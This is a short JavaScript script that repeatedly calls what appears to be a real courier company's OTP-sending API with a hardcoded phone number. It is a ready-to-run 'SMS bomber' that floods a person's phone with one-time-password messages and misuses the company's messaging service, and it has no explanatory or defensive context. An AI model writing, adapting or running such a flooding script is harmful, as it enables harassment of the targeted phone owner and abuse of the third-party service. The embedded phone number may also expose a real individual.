const length = 10;
const phone = '01602830626'

for (let i = 0; i < length; i++) {
    const URL = `https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=${phone}`;
    const options = {
        method: "GET",
    }

    fetch(URL, options)
        .then(res => res.json())
        .then(data => console.log(data))
}